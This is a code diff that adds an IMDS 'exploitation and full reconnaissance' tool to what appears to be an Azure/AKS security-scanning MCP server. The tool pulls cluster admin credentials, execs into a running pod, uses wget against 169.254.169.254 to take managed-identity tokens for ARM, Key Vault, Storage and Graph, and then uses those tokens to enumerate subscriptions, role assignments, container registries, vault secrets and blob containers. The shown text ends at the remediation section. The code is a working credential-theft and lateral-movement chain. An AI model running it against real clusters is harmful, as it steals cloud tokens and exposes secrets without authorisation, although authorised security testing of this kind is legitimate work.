@@ -839,6 +839,44 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
           required: ["subscriptionId", "resourceGroup", "clusterName"],
         },
       },
+      {
+        name: "test_aks_imds_full_recon",
+        description: "🔴 IMDS EXPLOITATION & FULL RECONNAISSANCE - Complete attack chain: IMDS token theft → permission enumeration → resource discovery → data plane access testing. Tests Pod→IMDS→Managed Identity→Azure Resources attack path. Enumerates all accessible subscriptions, resource groups, resources, role assignments, and tests data plane access (Storage, Key Vault, ACR).",
+        inputSchema: {
+          type: "object",
+          properties: {
+            subscriptionId: {
+              type: "string",
+              description: "Azure subscription ID",
+            },
+            resourceGroup: {
+              type: "string",
+              description: "Resource group containing the AKS cluster",
+            },
+            clusterName: {
+              type: "string",
+              description: "AKS cluster name",
+            },
+            namespace: {
+              type: "string",
+              description: "Target namespace to test IMDS from (default: uses first available pod)",
+            },
+            podName: {
+              type: "string",
+              description: "Specific pod to execute from (optional, auto-selects if not specified)",
+            },
+            deepScan: {
+              type: "boolean",
+              description: "Enable deep resource enumeration (slower but comprehensive). Default: true",
+            },
+            testDataPlane: {
+              type: "boolean",
+              description: "Test actual data plane access (Storage blobs, Key Vault secrets, ACR repos). Default: true",
+            },
+          },
+          required: ["subscriptionId", "resourceGroup", "clusterName"],
+        },
+      },
     ],
   };
 });
@@ -7318,6 +7356,829 @@ kubectl --token=\\$TOKEN get pods -A
         }
       }
 
+      case "test_aks_imds_full_recon": {
+        const { subscriptionId, resourceGroup, clusterName, namespace, podName, deepScan = true, testDataPlane = true } = request.params.arguments as {
+          subscriptionId: string;
+          resourceGroup: string;
+          clusterName: string;
+          namespace?: string;
+          podName?: string;
+          deepScan?: boolean;
+          testDataPlane?: boolean;
+        };
+
+        try {
+          const aksClient = new ContainerServiceClient(credential, subscriptionId);
+          
+          let output = `# 🔴 IMDS EXPLOITATION & FULL RECONNAISSANCE\n\n`;
+          output += `**Attack Chain:** Pod → IMDS → Managed Identity Token → Azure Resources\n`;
+          output += `**Target Cluster:** ${clusterName}\n`;
+          output += `**Resource Group:** ${resourceGroup}\n`;
+          output += `**Subscription:** ${subscriptionId}\n`;
+          output += `**Scan Time:** ${new Date().toISOString()}\n`;
+          output += `**Scanner:** Stratos MCP v1.10.0 (IMDS Attack Module)\n\n`;
+          output += `---\n\n`;
+
+          // Get cluster credentials
+          output += `## 🔑 Phase 0: Cluster Connection\n\n`;
+          
+          const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
+          
+          // Get admin credentials (kubeconfig)
+          let kubeconfig: string;
+          try {
+            const adminCreds = await aksClient.managedClusters.listClusterAdminCredentials(resourceGroup, clusterName);
+            if (!adminCreds.kubeconfigs || adminCreds.kubeconfigs.length === 0) {
+              throw new Error("No kubeconfig returned");
+            }
+            kubeconfig = Buffer.from(adminCreds.kubeconfigs[0].value!).toString('utf-8');
+            output += `✅ Admin credentials obtained\n\n`;
+          } catch (adminError: any) {
+            try {
+              const userCreds = await aksClient.managedClusters.listClusterUserCredentials(resourceGroup, clusterName);
+              if (!userCreds.kubeconfigs || userCreds.kubeconfigs.length === 0) {
+                throw new Error("No kubeconfig returned");
+              }
+              kubeconfig = Buffer.from(userCreds.kubeconfigs[0].value!).toString('utf-8');
+              output += `✅ User credentials obtained\n\n`;
+            } catch (userError: any) {
+              return {
+                content: [{
+                  type: 'text',
+                  text: `# ❌ Failed to Connect to Cluster\n\n` +
+                    `Could not obtain cluster credentials.\n\n` +
+                    `**Admin Error:** ${adminError.message}\n` +
+                    `**User Error:** ${userError.message}\n`
+                }],
+                isError: true,
+              };
+            }
+          }
+
+          // Convert kubeconfig from devicecode to azurecli auth
+          kubeconfig = kubeconfig.replace(/--login\s+devicecode/gi, '--login azurecli');
+          
+          // Save kubeconfig to temp file
+          const os = await import('os');
+          const pathMod = await import('path');
+          const fsMod = await import('fs').then(m => m.promises);
+          const tempKubeconfig = pathMod.join(os.tmpdir(), `stratos-imds-${Date.now()}.yaml`);
+          await fsMod.writeFile(tempKubeconfig, kubeconfig);
+          
+          const KUBECTL_TIMEOUT_MS = 30000;
+          
+          // Helper function to run kubectl
+          const runKubectl = async (args: string): Promise<string> => {
+            const { exec } = await import('child_process');
+            return new Promise((resolve, reject) => {
+              let killed = false;
+              const child = exec(
+                `kubectl --kubeconfig="${tempKubeconfig}" ${args}`,
+                { maxBuffer: 10 * 1024 * 1024, timeout: KUBECTL_TIMEOUT_MS },
+                (error, stdout, stderr) => {
+                  if (killed) return;
+                  if (error) {
+                    reject(new Error(stderr || error.message));
+                  } else {
+                    resolve(stdout);
+                  }
+                }
+              );
+              setTimeout(() => {
+                if (child.exitCode === null) {
+                  killed = true;
+                  child.kill('SIGTERM');
+                  reject(new Error(`kubectl timed out after ${KUBECTL_TIMEOUT_MS/1000}s`));
+                }
+              }, KUBECTL_TIMEOUT_MS + 1000);
+            });
+          };
+
+          // Track findings
+          const findings: Array<{severity: string; category: string; finding: string; details: string}> = [];
+          let criticalCount = 0, highCount = 0, mediumCount = 0, lowCount = 0;
+
+          // ========== PHASE 1: FIND TARGET POD ==========
+          output += `## 🎯 Phase 1: Target Pod Selection\n\n`;
+          
+          let targetNamespace = namespace;
+          let targetPod = podName;
+          let targetContainer = '';
+          
+          if (!targetPod) {
+            try {
+              // Find a running pod to execute from
+              const nsArg = targetNamespace ? `-n ${targetNamespace}` : '--all-namespaces';
+              const podsJson = await runKubectl(`get pods ${nsArg} -o json`);
+              const podsData = JSON.parse(podsJson);
+              
+              // Find first running pod
+              for (const pod of podsData.items || []) {
+                if (pod.status?.phase === 'Running') {
+                  targetNamespace = pod.metadata?.namespace;
+                  targetPod = pod.metadata?.name;
+                  targetContainer = pod.spec?.containers?.[0]?.name || '';
+                  break;
+                }
+              }
+              
+              if (!targetPod) {
+                output += `❌ No running pods found to execute IMDS test from\n\n`;
+                return { content: [{ type: 'text', text: output }] };
+              }
+            } catch (e: any) {
+              output += `❌ Failed to find pods: ${e.message}\n\n`;
+              return { content: [{ type: 'text', text: output }] };
+            }
+          }
+          
+          output += `| Parameter | Value |\n|-----------|-------|\n`;
+          output += `| Namespace | ${targetNamespace} |\n`;
+          output += `| Pod | ${targetPod} |\n`;
+          output += `| Container | ${targetContainer || 'default'} |\n\n`;
+
+          // Helper to execute command in pod
+          const execInPod = async (cmd: string): Promise<string> => {
+            const containerArg = targetContainer ? `-c ${targetContainer}` : '';
+            return await runKubectl(`exec -n ${targetNamespace} ${targetPod} ${containerArg} -- sh -c '${cmd}'`);
+          };
+
+          // ========== PHASE 2: IMDS ACCESSIBILITY CHECK ==========
+          output += `## 🔍 Phase 2: IMDS Accessibility Check\n\n`;
+          
+          let imdsAccessible = false;
+          let tenantId = '';
+          
+          try {
+            const imdsCheck = await execInPod(`wget -qO- --timeout=3 --header="Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -200`);
+            
+            if (imdsCheck.includes('compute') || imdsCheck.includes('vmId')) {
+              imdsAccessible = true;
+              output += `✅ **IMDS is ACCESSIBLE from this pod!**\n\n`;
+              output += `\`\`\`json\n${imdsCheck.substring(0, 500)}...\n\`\`\`\n\n`;
+              
+              findings.push({
+                severity: 'CRITICAL',
+                category: 'IMDS',
+                finding: 'IMDS accessible from pod - token theft possible',
+                details: `Pod ${targetPod} in ${targetNamespace} can reach IMDS`
+              });
+              criticalCount++;
+            } else {
+              output += `✅ IMDS appears to be blocked or unreachable\n`;
+              output += `Response: ${imdsCheck.substring(0, 200)}\n\n`;
+            }
+          } catch (e: any) {
+            if (e.message.includes('timed out') || e.message.includes('timeout')) {
+              output += `✅ IMDS is blocked (connection timed out) - Good security posture\n\n`;
+            } else {
+              output += `⚠️ IMDS check failed: ${e.message}\n\n`;
+            }
+          }
+
+          if (!imdsAccessible) {
+            output += `## ✅ IMDS Attack Chain Blocked\n\n`;
+            output += `The IMDS endpoint (169.254.169.254) is not accessible from this pod.\n`;
+            output += `This is the expected secure configuration.\n\n`;
+            output += `**Possible reasons:**\n`;
+            output += `- Network Policy blocking IMDS\n`;
+            output += `- Pod using Workload Identity instead of IMDS\n`;
+            output += `- Azure CNI with IMDS restrictions\n\n`;
+            
+            // Cleanup
+            try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
+            
+            return { content: [{ type: 'text', text: output }] };
+          }
+
+          // ========== PHASE 3: IDENTITY DISCOVERY ==========
+          output += `## 🔐 Phase 3: Identity Discovery\n\n`;
+          
+          try {
+            const identityInfo = await execInPod(`wget -qO- --header="Metadata:true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>&1`);
+            
+            if (identityInfo.includes('tenantId')) {
+              const tenantMatch = identityInfo.match(/"tenantId"\s*:\s*"([^"]+)"/);
+              tenantId = tenantMatch ? tenantMatch[1] : '';
+              output += `**Tenant ID:** \`${tenantId}\`\n\n`;
+              output += `\`\`\`json\n${identityInfo}\n\`\`\`\n\n`;
+            }
+          } catch (e: any) {
+            output += `⚠️ Identity info not available: ${e.message}\n\n`;
+          }
+
+          // ========== PHASE 4: TOKEN THEFT ==========
+          output += `## 💀 Phase 4: Token Theft\n\n`;
+          output += `Attempting to steal tokens for multiple resources...\n\n`;
+          
+          interface StolenToken {
+            resource: string;
+            clientId: string;
+            accessToken: string;
+            expiresOn: string;
+          }
+          
+          const stolenTokens: StolenToken[] = [];
+          const resources = [
+            { name: 'ARM (Azure Management)', resource: 'https://management.azure.com/' },
+            { name: 'Key Vault', resource: 'https://vault.azure.net/' },
+            { name: 'Storage', resource: 'https://storage.azure.com/' },
+            { name: 'Graph API', resource: 'https://graph.microsoft.com/' },
+          ];
+          
+          output += `| Resource | Status | Client ID | Expires |\n|----------|--------|-----------|----------|\n`;
+          
+          for (const res of resources) {
+            try {
+              const tokenResp = await execInPod(`wget -qO- --header="Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(res.resource)}" 2>&1`);
+              
+              if (tokenResp.includes('access_token')) {
+                const tokenData = JSON.parse(tokenResp);
+                const clientId = tokenData.client_id || 'unknown';
+                const expiresOn = new Date(parseInt(tokenData.expires_on) * 1000).toISOString();
+                const accessToken = tokenData.access_token;
+                
+                stolenTokens.push({
+                  resource: res.resource,
+                  clientId,
+                  accessToken,
+                  expiresOn
+                });
+                
+                output += `| ${res.name} | ✅ STOLEN | \`${clientId.substring(0, 8)}...\` | ${expiresOn.split('T')[0]} |\n`;
+                
+                findings.push({
+                  severity: 'CRITICAL',
+                  category: 'Token Theft',
+                  finding: `${res.name} token stolen via IMDS`,
+                  details: `Client ID: ${clientId}`
+                });
+                criticalCount++;
+              } else {
+                output += `| ${res.name} | ❌ Failed | - | - |\n`;
+              }
+            } catch (e: any) {
+              output += `| ${res.name} | ❌ Error | - | ${e.message.substring(0, 30)} |\n`;
+            }
+          }
+          output += `\n`;
+
+          // Get the ARM token for further enumeration
+          const armToken = stolenTokens.find(t => t.resource.includes('management.azure.com'))?.accessToken;
+          
+          if (!armToken) {
+            output += `⚠️ Could not obtain ARM token - limited enumeration possible\n\n`;
+          } else {
+            output += `✅ ARM token obtained - proceeding with full enumeration\n\n`;
+
+            // ========== PHASE 5: SUBSCRIPTION ENUMERATION ==========
+            output += `## 📋 Phase 5: Subscription Enumeration\n\n`;
+            
+            try {
+              const subsResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions?api-version=2022-12-01" 2>&1`);
+              
+              if (subsResp.includes('"value"')) {
+                const subsData = JSON.parse(subsResp);
+                const subs = subsData.value || [];
+                
+                output += `Found **${subs.length}** accessible subscription(s):\n\n`;
+                output += `| Subscription ID | Name | State |\n|-----------------|------|-------|\n`;
+                
+                for (const sub of subs) {
+                  output += `| \`${sub.subscriptionId}\` | ${sub.displayName} | ${sub.state} |\n`;
+                }
+                output += `\n`;
+                
+                if (subs.length > 0) {
+                  findings.push({
+                    severity: 'HIGH',
+                    category: 'Subscriptions',
+                    finding: `${subs.length} subscription(s) accessible via stolen token`,
+                    details: subs.map((s: any) => s.displayName).join(', ')
+                  });
+                  highCount++;
+                }
+              }
+            } catch (e: any) {
+              output += `⚠️ Subscription enumeration failed: ${e.message}\n\n`;
+            }
+
+            // ========== PHASE 6: ROLE ASSIGNMENTS ==========
+            output += `## 🎭 Phase 6: Role Assignment Analysis\n\n`;
+            
+            try {
+              const rolesResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" 2>&1`);
+              
+              if (rolesResp.includes('"value"')) {
+                const rolesData = JSON.parse(rolesResp);
+                const roles = rolesData.value || [];
+                
+                // Get role definitions to map IDs to names
+                const roleDefResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01" 2>&1`);
+                let roleDefMap: Record<string, string> = {};
+                
+                try {
+                  const roleDefData = JSON.parse(roleDefResp);
+                  for (const rd of roleDefData.value || []) {
+                    roleDefMap[rd.name] = rd.properties?.roleName || rd.name;
+                  }
+                } catch (e) {}
+                
+                output += `Found **${roles.length}** role assignment(s):\n\n`;
+                output += `| Role | Scope | Principal Type |\n|------|-------|----------------|\n`;
+                
+                const dangerousRoles = ['Owner', 'Contributor', 'User Access Administrator', 'Network Contributor'];
+                let dangerousCount = 0;
+                
+                for (const role of roles.slice(0, 20)) {
+                  const roleDefId = role.properties?.roleDefinitionId?.split('/').pop() || '';
+                  const roleName = roleDefMap[roleDefId] || roleDefId.substring(0, 20);
+                  const scope = role.properties?.scope?.split('/').slice(-2).join('/') || '';
+                  const principalType = role.properties?.principalType || 'Unknown';
+                  
+                  if (dangerousRoles.some(dr => roleName.includes(dr))) {
+                    dangerousCount++;
+                    output += `| 🔴 **${roleName}** | ${scope} | ${principalType} |\n`;
+                  } else {
+                    output += `| ${roleName} | ${scope} | ${principalType} |\n`;
+                  }
+                }
+                
+                if (roles.length > 20) {
+                  output += `| ... | (${roles.length - 20} more) | ... |\n`;
+                }
+                output += `\n`;
+                
+                if (dangerousCount > 0) {
+                  findings.push({
+                    severity: 'CRITICAL',
+                    category: 'RBAC',
+                    finding: `${dangerousCount} high-privilege role(s) assigned`,
+                    details: 'Owner, Contributor, or Network Contributor roles found'
+                  });
+                  criticalCount++;
+                }
+              }
+            } catch (e: any) {
+              output += `⚠️ Role enumeration failed: ${e.message}\n\n`;
+            }
+
+            // ========== PHASE 7: RESOURCE GROUP ENUMERATION ==========
+            output += `## 📁 Phase 7: Resource Group Enumeration\n\n`;
+            
+            let resourceGroups: string[] = [];
+            try {
+              const rgResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/resourcegroups?api-version=2021-04-01" 2>&1`);
+              
+              if (rgResp.includes('"value"')) {
+                const rgData = JSON.parse(rgResp);
+                resourceGroups = (rgData.value || []).map((rg: any) => rg.name);
+                
+                output += `Found **${resourceGroups.length}** resource group(s):\n\n`;
+                output += `| Resource Group | Location |\n|----------------|----------|\n`;
+                
+                for (const rg of rgData.value?.slice(0, 15) || []) {
+                  output += `| ${rg.name} | ${rg.location} |\n`;
+                }
+                
+                if (resourceGroups.length > 15) {
+                  output += `| ... | (${resourceGroups.length - 15} more) |\n`;
+                }
+                output += `\n`;
+                
+                findings.push({
+                  severity: 'HIGH',
+                  category: 'Resources',
+                  finding: `${resourceGroups.length} resource group(s) accessible`,
+                  details: resourceGroups.slice(0, 5).join(', ')
+                });
+                highCount++;
+              }
+            } catch (e: any) {
+              output += `⚠️ Resource group enumeration failed: ${e.message}\n\n`;
+            }
+
+            if (deepScan) {
+              // ========== PHASE 8: RESOURCE ENUMERATION ==========
+              output += `## 🗃️ Phase 8: Resource Enumeration\n\n`;
+              
+              const resourceTypes = [
+                { type: 'Microsoft.Storage/storageAccounts', name: 'Storage Accounts', icon: '📦' },
+                { type: 'Microsoft.KeyVault/vaults', name: 'Key Vaults', icon: '🔐' },
+                { type: 'Microsoft.ContainerRegistry/registries', name: 'Container Registries', icon: '🐳' },
+                { type: 'Microsoft.Sql/servers', name: 'SQL Servers', icon: '🗄️' },
+                { type: 'Microsoft.DocumentDB/databaseAccounts', name: 'Cosmos DB', icon: '🌐' },
+                { type: 'Microsoft.Compute/virtualMachines', name: 'Virtual Machines', icon: '💻' },
+                { type: 'Microsoft.ContainerService/managedClusters', name: 'AKS Clusters', icon: '☸️' },
+                { type: 'Microsoft.Web/sites', name: 'App Services', icon: '🌍' },
+                { type: 'Microsoft.Network/virtualNetworks', name: 'Virtual Networks', icon: '🔗' },
+                { type: 'Microsoft.Network/networkSecurityGroups', name: 'NSGs', icon: '🛡️' },
+              ];
+              
+              output += `| Resource Type | Count | Examples |\n|---------------|-------|----------|\n`;
+              
+              interface ResourceCount {
+                type: string;
+                name: string;
+                icon: string;
+                count: number;
+                examples: string[];
+              }
+              const resourceCounts: ResourceCount[] = [];
+              
+              for (const rt of resourceTypes) {
+                try {
+                  const resResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/${rt.type}?api-version=2023-01-01" 2>&1`);
+                  
+                  if (resResp.includes('"value"')) {
+                    const resData = JSON.parse(resResp);
+                    const resources = resData.value || [];
+                    const examples = resources.slice(0, 3).map((r: any) => r.name);
+                    
+                    resourceCounts.push({
+                      type: rt.type,
+                      name: rt.name,
+                      icon: rt.icon,
+                      count: resources.length,
+                      examples
+                    });
+                    
+                    output += `| ${rt.icon} ${rt.name} | **${resources.length}** | ${examples.join(', ') || '-'} |\n`;
+                  } else {
+                    output += `| ${rt.icon} ${rt.name} | 0 | - |\n`;
+                  }
+                } catch (e: any) {
+                  output += `| ${rt.icon} ${rt.name} | ❌ | Error |\n`;
+                }
+              }
+              output += `\n`;
+              
+              const totalResources = resourceCounts.reduce((sum, rc) => sum + rc.count, 0);
+              if (totalResources > 0) {
+                findings.push({
+                  severity: 'HIGH',
+                  category: 'Resources',
+                  finding: `${totalResources} total resources accessible across ${resourceCounts.filter(r => r.count > 0).length} types`,
+                  details: resourceCounts.filter(r => r.count > 0).map(r => `${r.count} ${r.name}`).join(', ')
+                });
+                highCount++;
+              }
+            }
+
+            if (testDataPlane) {
+              // ========== PHASE 9: DATA PLANE ACCESS TESTING ==========
+              output += `## 🔓 Phase 9: Data Plane Access Testing\n\n`;
+              
+              // Test ACR Access
+              output += `### 🐳 Container Registry (ACR) Access\n\n`;
+              
+              try {
+                // Find ACR registries
+                const acrResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.ContainerRegistry/registries?api-version=2023-01-01-preview" 2>&1`);
+                
+                if (acrResp.includes('"value"')) {
+                  const acrData = JSON.parse(acrResp);
+                  const acrs = acrData.value || [];
+                  
+                  for (const acr of acrs.slice(0, 3)) {
+                    const acrName = acr.name;
+                    const loginServer = acr.properties?.loginServer || `${acrName}.azurecr.io`;
+                    
+                    output += `**Testing:** ${loginServer}\n\n`;
+                    
+                    try {
+                      // Get ACR token exchange
+                      const exchangeCmd = `wget -qO- --post-data="grant_type=access_token&service=${loginServer}&tenant=${tenantId || 'common'}&access_token=${armToken}" "https://${loginServer}/oauth2/exchange" 2>&1`;
+                      const exchangeResp = await execInPod(exchangeCmd);
+                      
+                      if (exchangeResp.includes('refresh_token')) {
+                        const refreshToken = exchangeResp.match(/"refresh_token"\s*:\s*"([^"]+)"/)?.[1];
+                        
+                        if (refreshToken) {
+                          // Get access token with catalog scope
+                          const tokenCmd = `wget -qO- --post-data="grant_type=refresh_token&service=${loginServer}&scope=registry:catalog:*&refresh_token=${refreshToken}" "https://${loginServer}/oauth2/token" 2>&1`;
+                          const tokenResp = await execInPod(tokenCmd);
+                          
+                          if (tokenResp.includes('access_token')) {
+                            const acrAccessToken = tokenResp.match(/"access_token"\s*:\s*"([^"]+)"/)?.[1];
+                            
+                            if (acrAccessToken) {
+                              // List catalog
+                              const catalogResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${acrAccessToken}" "https://${loginServer}/v2/_catalog" 2>&1`);
+                              
+                              if (catalogResp.includes('repositories')) {
+                                const catalogData = JSON.parse(catalogResp);
+                                const repos = catalogData.repositories || [];
+                                
+                                output += `✅ **ACR EXPLOITED!** ${repos.length} repositories accessible\n\n`;
+                                output += `| Repository | Status |\n|------------|--------|\n`;
+                                
+                                for (const repo of repos.slice(0, 10)) {
+                                  output += `| ${repo} | ✅ Accessible |\n`;
+                                }
+                                
+                                if (repos.length > 10) {
+                                  output += `| ... | (${repos.length - 10} more) |\n`;
+                                }
+                                output += `\n`;
+                                
+                                findings.push({
+                                  severity: 'CRITICAL',
+                                  category: 'ACR',
+                                  finding: `${repos.length} container repositories accessible in ${acrName}`,
+                                  details: `Full catalog enumeration successful - potential secret exposure in images`
+                                });
+                                criticalCount++;
+                              }
+                            }
+                          }
+                        }
+                      } else {
+                        output += `❌ ACR token exchange failed\n\n`;
+                      }
+                    } catch (acrError: any) {
+                      output += `❌ ACR access test failed: ${acrError.message}\n\n`;
+                    }
+                  }
+                  
+                  if (acrs.length === 0) {
+                    output += `No ACR registries found in subscription\n\n`;
+                  }
+                }
+              } catch (e: any) {
+                output += `⚠️ ACR enumeration failed: ${e.message}\n\n`;
+              }
+
+              // Test Key Vault Access
+              output += `### 🔐 Key Vault Access\n\n`;
+              
+              const kvToken = stolenTokens.find(t => t.resource.includes('vault.azure.net'))?.accessToken;
+              
+              if (kvToken) {
+                try {
+                  const kvResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.KeyVault/vaults?api-version=2023-02-01" 2>&1`);
+                  
+                  if (kvResp.includes('"value"')) {
+                    const kvData = JSON.parse(kvResp);
+                    const keyVaults = kvData.value || [];
+                    
+                    output += `| Key Vault | Secrets Access | Keys Access |\n|-----------|----------------|-------------|\n`;
+                    
+                    for (const kv of keyVaults.slice(0, 5)) {
+                      const kvName = kv.name;
+                      const kvUri = kv.properties?.vaultUri || `https://${kvName}.vault.azure.net/`;
+                      
+                      let secretsAccess = '❌';
+                      let keysAccess = '❌';
+                      
+                      try {
+                        const secretsResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${kvToken}" "${kvUri}secrets?api-version=7.4" 2>&1`);
+                        if (secretsResp.includes('"value"')) {
+                          const secretsData = JSON.parse(secretsResp);
+                          const secretCount = secretsData.value?.length || 0;
+                          secretsAccess = `✅ ${secretCount} secrets`;
+                          
+                          findings.push({
+                            severity: 'CRITICAL',
+                            category: 'Key Vault',
+                            finding: `${secretCount} secrets accessible in ${kvName}`,
+                            details: 'Secret enumeration successful via stolen token'
+                          });
+                          criticalCount++;
+                        }
+                      } catch (e) {}
+                      
+                      try {
+                        const keysResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${kvToken}" "${kvUri}keys?api-version=7.4" 2>&1`);
+                        if (keysResp.includes('"value"')) {
+                          const keysData = JSON.parse(keysResp);
+                          keysAccess = `✅ ${keysData.value?.length || 0} keys`;
+                        }
+                      } catch (e) {}
+                      
+                      output += `| ${kvName} | ${secretsAccess} | ${keysAccess} |\n`;
+                    }
+                    output += `\n`;
+                  }
+                } catch (e: any) {
+                  output += `⚠️ Key Vault enumeration failed: ${e.message}\n\n`;
+                }
+              } else {
+                output += `No Key Vault token available\n\n`;
+              }
+
+              // Test Storage Access
+              output += `### 📦 Storage Account Access\n\n`;
+              
+              const storageToken = stolenTokens.find(t => t.resource.includes('storage.azure.com'))?.accessToken;
+              
+              if (storageToken) {
+                try {
+                  const storageResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" 2>&1`);
+                  
+                  if (storageResp.includes('"value"')) {
+                    const storageData = JSON.parse(storageResp);
+                    const storageAccounts = storageData.value || [];
+                    
+                    output += `Found ${storageAccounts.length} storage account(s)\n\n`;
+                    output += `| Storage Account | Blob Access | Container Count |\n|-----------------|-------------|------------------|\n`;
+                    
+                    for (const sa of storageAccounts.slice(0, 5)) {
+                      const saName = sa.name;
+                      let blobAccess = '❌';
+                      
+                      try {
+                        const blobResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${storageToken}" --header="x-ms-version: 2021-06-08" "https://${saName}.blob.core.windows.net/?comp=list" 2>&1`);
+                        if (blobResp.includes('Container')) {
+                          const containerMatches = blobResp.match(/<Name>([^<]+)<\/Name>/g) || [];
+                          blobAccess = `✅ ${containerMatches.length} containers`;
+                          
+                          if (containerMatches.length > 0) {
+                            findings.push({
+                              severity: 'HIGH',
+                              category: 'Storage',
+                              finding: `${containerMatches.length} blob containers accessible in ${saName}`,
+                              details: 'Blob enumeration successful'
+                            });
+                            highCount++;
+                          }
+                        }
+                      } catch (e) {}
+                      
+                      output += `| ${saName} | ${blobAccess} | - |\n`;
+                    }
+                    output += `\n`;
+                  }
+                } catch (e: any) {
+                  output += `⚠️ Storage enumeration failed: ${e.message}\n\n`;
+                }
+              } else {
+                output += `No Storage token available\n\n`;
+              }
+            }
+
+            // ========== PHASE 10: PRIVILEGE ESCALATION PATHS ==========
+            output += `## 🚀 Phase 10: Privilege Escalation Paths\n\n`;
+            
+            const privEscPaths: Array<{path: string; risk: string; description: string}> = [];
+            
+            // Check for dangerous permissions
+            try {
+              const permResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" 2>&1`);
+              
+              if (permResp.includes('"value"')) {
+                const permData = JSON.parse(permResp);
+                const permissions = permData.value || [];
+                
+                for (const perm of permissions) {
+                  const actions = perm.actions || [];
+                  
+                  if (actions.some((a: string) => a.includes('Microsoft.Authorization/roleAssignments/write') || a === '*')) {
+                    privEscPaths.push({
+                      path: 'Role Assignment Creation',
+                      risk: 'CRITICAL',
+                      description: 'Can create new role assignments → Grant self Owner access'
+                    });
+                  }
+                  
+                  if (actions.some((a: string) => a.includes('Microsoft.Compute/virtualMachines/write') || a === '*')) {
+                    privEscPaths.push({
+                      path: 'VM Creation → IMDS Pivot',
+                      risk: 'HIGH',
+                      description: 'Can create VMs with managed identity → Pivot to other identities'
+                    });
+                  }
+                  
+                  if (actions.some((a: string) => a.includes('Microsoft.Network') || a === '*')) {
+                    privEscPaths.push({
+                      path: 'Network Modification',
+                      risk: 'HIGH',
+                      description: 'Can modify NSGs/VNets → Enable lateral movement'
+                    });
+                  }
+                }
+              }
+            } catch (e: any) {
+              output += `⚠️ Permission check failed\n\n`;
+            }
+            
+            if (privEscPaths.length > 0) {
+              output += `| Attack Path | Risk | Description |\n|-------------|------|-------------|\n`;
+              for (const path of privEscPaths) {
+                const icon = path.risk === 'CRITICAL' ? '🔴' : path.risk === 'HIGH' ? '🟠' : '🟡';
+                output += `| ${icon} ${path.path} | ${path.risk} | ${path.description} |\n`;
+                
+                findings.push({
+                  severity: path.risk,
+                  category: 'PrivEsc',
+                  finding: path.path,
+                  details: path.description
+                });
+                if (path.risk === 'CRITICAL') criticalCount++;
+                else if (path.risk === 'HIGH') highCount++;
+                else mediumCount++;
+              }
+              output += `\n`;
+            } else {
+              output += `No obvious privilege escalation paths found.\n\n`;
+            }
+          }
+
+          // ========== SUMMARY ==========
+          output += `---\n\n`;
+          output += `## 📊 Attack Summary\n\n`;
+          
+          output += `### MITRE ATT&CK Techniques\n\n`;
+          output += `| Technique | ID | Status |\n|-----------|-----|--------|\n`;
+          output += `| Cloud Instance Metadata API | T1552.005 | ✅ Exploited |\n`;
+          output += `| Cloud Accounts | T1078.004 | ✅ Token Theft |\n`;
+          output += `| Data from Cloud Storage | T1530 | ${findings.some(f => f.category === 'Storage') ? '✅ Accessible' : '❌ Blocked'} |\n`;
+          output += `| Container & Resource Discovery | T1613 | ✅ Enumerated |\n`;
+          output += `| Steal Application Access Token | T1528 | ✅ ${stolenTokens.length} tokens |\n\n`;
+
+          output += `### Findings Summary\n\n`;
+          output += `| Severity | Count |\n|----------|-------|\n`;
+          output += `| 🔴 CRITICAL | ${criticalCount} |\n`;
+          output += `| 🟠 HIGH | ${highCount} |\n`;
+          output += `| 🟡 MEDIUM | ${mediumCount} |\n`;
+          output += `| 🟢 LOW | ${lowCount} |\n`;
+          output += `| **TOTAL** | **${findings.length}** |\n\n`;
+
+          if (findings.length > 0) {
+            output += `### All Findings\n\n`;
+            output += `| # | Severity | Category | Finding | Details |\n|---|----------|----------|---------|----------|\n`;
+            let i = 1;
+            for (const f of findings) {
+              const icon = f.severity === 'CRITICAL' ? '🔴' : f.severity === 'HIGH' ? '🟠' : f.severity === 'MEDIUM' ? '🟡' : '🟢';
+              output += `| ${i++} | ${icon} ${f.severity} | ${f.category} | ${f.finding} | ${f.details.substring(0, 50)}... |\n`;
+            }
+            output += `\n`;
+          }
+
+          // Risk score
+          const riskScore = (criticalCount * 40) + (highCount * 20) + (mediumCount * 5) + (lowCount * 1);
+          let riskLevel = 'LOW';
+          let riskEmoji = '🟢';
+          if (riskScore >= 100) { riskLevel = 'CRITICAL'; riskEmoji = '🔴'; }
+          else if (riskScore >= 50) { riskLevel = 'HIGH'; riskEmoji = '🟠'; }
+          else if (riskScore >= 20) { riskLevel = 'MEDIUM'; riskEmoji = '🟡'; }
+          
+          output += `### Risk Assessment\n\n`;
+          output += `**Risk Score:** ${riskScore}\n`;
+          output += `**Risk Level:** ${riskEmoji} **${riskLevel}**\n\n`;
+
+          // Remediation
